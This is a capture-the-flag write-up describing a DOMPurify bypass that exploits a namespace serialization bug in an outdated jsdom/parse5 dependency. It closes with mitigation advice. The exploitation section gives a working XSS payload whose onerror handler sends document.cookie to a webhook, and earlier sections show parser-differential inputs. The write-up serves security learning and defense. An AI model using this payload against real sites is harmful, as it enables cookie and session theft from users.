# TL;DR<a id="TL;DR"></a>
    **- Challenge Setup:** This challenge is about a **DOMPurify** bypass
    **- Key Discoveries:** **DOMPurify** is used server-side
    **- Vulnerability:** The used **JSDOM** library to offer a DOM parser for **DOMPurify** is outdated
    **- Exploitation:** By abusing an implementation but in the old **JSDOM** version, we can bypass **DOMPurify**

# 1. Introduction<a id="introduction"></a>
This web challenge aimed to identify and exploit a bypass in **DOMPurify** to achieve Cross-Site Scripting (XSS) and ultimately steal the admin's cookie. The challenge description already hints at the role of a sanitizer in the exploitation process.
<span>
In the following sections, we walk through the entire process, from the initial analysis to the final exploitation.

# 2. Reconnaissance<a id="reconnaissance"></a>
Fortunately, the source code for the website is provided in this challenge. It is a small website built with **Next.js** using **React** and written in **TypeScript**. An admin bot, using **Chromium**, checks the website every 60 seconds and carries the flag in its cookie. Moreover, the attribute `httpOnly: false` allows us to access the cookie via JavaScript, so there is a high probability that this is an XSS challenge.
<span>
On the landing page, where we can submit our ratings, the input is reflected in both input fields:

![landing page](ctf/writeups/cscg/airsmeller/landing_page.png "landing page")

But it seems like there is some kind of sanitizer removing malicious input from the comment field and thus preventing XSS. A closer look at the source code in `src/components/ratings.tsx` reveals that the sanitizer used for filtering malicious comments is **DOMPurify**, a very popular and powerful XSS sanitizer. The sanitized output is then injected into the comment section using **React**'s `dangerouslySetInnerHTML`. It functions similarly to the traditional `innerHTML` in vanilla JavaScript. Thus, the comment input field acts as an HTML injection vector. The reason for this design decision could be to allow users to style their comments in a fancy way with some HTML tags. This means that bypassing **DOMPurify** should be enough to have an XSS.
<span>
In this challenge, **DOMPurify** is used server-side, so it requires a DOM parser. The challenge uses **jsdom** for this purpose and a look at the `package.json` reveals that **DOMPurify** is slightly outdated. Notably, to exploit the mXSS-style bypass, which was patched in the latest version, requires a non-default configuration of **DOMPurify**, enabling the `SAFE_FOR_TEMPLATES` option; we don't have the luxury of this in this challenge.
<span>
More interestingly, the version of **jsdom** v19.0.0 is quite old. Reviewing the [README](https://github.com/cure53/DOMPurify?tab=readme-ov-file\#running-dompurify-on-the-server) of **DOMPurify** confirms that the older version of **jsdom** may introduce vulnerabilities:

```
Running DOMPurify on the server requires a DOM to be present, which is probably no surprise. Usually, jsdom is the tool of choice and we strongly recommend using the latest version of jsdom.

Why? Because older versions of jsdom are known to be buggy in ways that result in XSS even if DOMPurify does everything 100% correctly. There are known attack vectors in, e.g. jsdom v19.0.0 that are fixed in jsdom v20.0.0 - and we really recommend keeping jsdom up to date because of that.
```

# 3. Bypassing DOMPurify - Finding differentials<a id="bypassing DOMPurify - finding differentials"></a>
Bypassing **DOMPurify** is challenging when it is used correctly. Typically, you would use the latest version of **DOMPurify** client-side so that the sanitizer uses the same DOM parser as the browser rendering the website. When using a sanitizer like **DOMPurify**, the untrusted payload is parsed at least two times:
<span>
The first time, by the DOM parser used by **DOMPurify**, and the second time by the DOM parser of the browser, the website is being rendered on. Using the **DOMPurify** client-side avoids parser differentials that originate from **DOMPurify** using a different parser in the backend than the client. Nevertheless, bypassing even the latest version of **DOMPurify** running client-side is not impossible. If you are interested in the whole topic around mutation XSS (mXSS), I can highly recommend [this article](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes).
<span>
As mentioned, the challenge uses **DOMPurify** server-side with an outdated DOM parser **jsdom**. This design decision might be intended to prevent malicious payloads from reaching the server's database, reducing the overhead for clients and ensuring that even a tampered client gets sanitized content. Essentially, the challenge goal is to find bugs in the parser or serializer implementation of **jsdom** and exploit them. With the help of such a bug, we could craft a malicious payload so the **DOMPurify** sanitization process using **jsdom** won't detect it. But when the payload is being rendered in **Chromium** with its underlying **DOMParser**, this will lead to malicious behavior. To find the differential, we have to dive deep into the source code of **jsdom** and its underlying parser and serializer, **parse5**.
<span>
With the outdated **jsdom** version, we review the corresponding [release notes](https://github.com/jsdom/jsdom/releases/tag/20.0.0) and discover several noteworthy fixes introduced in **jsdom** v20.0.0:

```
Updated parse5, bringing along some HTML parsing and serialization fixes. (fb55)
```

This change motivates us to examine the exact [code modifications](https://github.com/jsdom/jsdom/commit/2e355263e5cae2e4647b0956f777c0abd2c62d5b). Aside from updating the underlying HTML parser and serializer **parse5** to v7.0.0, nothing particularly exploitable in **jsdom** itself is immediately apparent. Further investigation into the [release notes](https://github.com/inikulin/parse5/releases/tag/v7.0.0) for **parse5** v7.0.0 reveals a significant [pull request](https://github.com/inikulin/parse5/pull/383) titled:

```
Refactor & improve serializer
```

Moreover, an interesting [issue](https://github.com/inikulin/parse5/issues/333) describes a bug in the HTML serializer where the namespace of any content is not properly checked before decoding and applying it to the corresponding node. For example, given input like:

```html
<svg><style>&lt;</style></svg>

<style>&lt;</style>
```

**jsdom**'s `innerHTML` serializes it as:

```html
<svg><style><</style></svg>

<style>&lt;</style>
```

whereas **Chromium**'s **DOMParser**, following the HTML specification, serializes it as:

```html
<svg><style>&lt;</style></svg>

<style>&lt;</style>
```

In short, **jsdom** decodes the opening tag in the SVG namespace, which is not valid per the [HTML specification](https://html.spec.whatwg.org/#serialising-html-fragments). During initialization, **DOMPurify** creates a document with:

```javascript
doc = new DOMParser().parseFromString(dirtyPayload, PARSER_MEDIA_TYPE);
```

The **jsdom** implementation of `parseFromString` uses the **parse5** [parser](https://github.com/inikulin/parse5/blob/v6.0.0/packages/parse5/lib/parser/index.js). Eventually after sanitization, **DOMPurify** calls:

```javascript
let serializedHTML = WHOLE_DOCUMENT ? body.outerHTML : body.innerHTML;
```

This will internally use the **parse5** [serializer](https://github.com/inikulin/parse5/blob/v6.0.0/packages/parse5/lib/serializer/index.js), which has the aforementioned namespace-dependent bug. Thus, the malicious payload is processed in the following stages, each potentially modifying its HTML structure and representation:
<span>
Dirty HTML → **parse5** parser → **DOMPurify** sanitizer → **parse5** serializer → **Chromium** **DOMParser**
<span>
**DOMPurify** assumes that the DOM parser implements the HTML specifications correctly. In this case, it doesn't interpret the `&lt;` as an opening tag, because it relies on the output of the **jsdom** serializer. The serializer treats it as a text node `#text` within the `style` tag, similar to regular content, for example, in a `p` tag. However, after sanitization calling `innerHTML` and thus using the buggy **parse5** serializer, the harmless `&lt;` is decoded as an actual HTML opening tag `<`, causing **DOMPurify** to return a malicious payload with the encoded tag. So effectively, in this challenge **DOMPurify** itself potentially makes harmless inputs harmful.
<span>
There are additional bugs in **parse5** v6.0.0, such as [this one](https://github.com/inikulin/parse5/pull/451), which might also be exploitable in this challenge. The difference from the previously described bug is that this one occurs in the **parse5** parser, whereas the earlier bug was in the **parse5** serializer. According to the HTML specification, the closing tags `</br>` and `</p>` must not be children of `<svg>` or `<math>` elements. If they are placed inside these elements, they are automatically moved outside, effectively closing the `<svg>` or `<math>` tags. For instance, a payload like:

```html
<svg></br><a>
```

will be serialized by **jsdom**'s `innerHTML` as

```html
<svg><span><a></a></svg>
```

while **Chromium**'s **DOMParser** serializes it as:

```html
<svg></svg><span><a></a>
```

It is worth noting that all of this code search in GitHub was not necessary to uncover the parser differentials and even a working payload for the challenge. For more insights into parsing differentials used to bypass HTML sanitizers like **DOMPurify**, I refer to [this research paper](https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf).

# 4. Exploitation<a id="exploitation"></a>
The final payload is straightforward once you understood the serializer bug in **parse5**:

```html
<svg><style>&lt;img src onerror='window.location=(`reqest-bin/${document.cookie}`)';><a>
```

By using the encoded opening tag `&lt;`, we can inject an image tag with an `onerror` event past the **DOMPurify** sanitizer. This event triggers a redirect to our webhook, effectively exfiltrating the cookie that contains the flag `CSCG{0ld_A1r_Smeels_B4d}`.

# 5. Mitigation<a id="mitigation"></a>
The vulnerability is about using **DOMPurify** with an outdated version of **jsdom** (and consequently an outdated **parse5** version). Updating these dependencies would resolve the issue. So always precisely read the documentation on how to use security-relevant libraries like **DOMPurify**. Additionally, shifting **DOMPurify** from a server-side to a client-side implementation would prevent parser and serializer differentials, as the same DOM parser would be used throughout. Implementing a robust Content Security Policy (CSP) further restricts JavaScript execution, adding another layer of defense against XSS. Morover, try to use `httpOnly` cookies on your website if none of your javascript needs to access cookies. Finally, if not absolutely necessary, avoid using `innerHTML` (or in this case `dangerouslySetInnerHTML`) with untrusted input.
